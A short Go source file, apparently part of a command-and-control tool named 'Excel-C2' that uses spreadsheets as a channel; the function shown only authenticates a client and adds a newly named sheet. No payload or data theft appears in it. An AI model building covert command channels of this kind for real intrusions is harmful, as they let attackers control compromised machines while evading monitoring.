package C2

import (
	"Excel-C2/internal/utils"
	"fmt"
)

func Run(c2 *Client) {

	// perform authentication
	c2.Authenticate()

	// new sheet meta
	newSheetName := utils.GenerateNewSheetName()
	_, err := c2.AddSheet(newSheetName)
	if err != nil {
		fmt.Println("Add sheet error ", err)
	}

}
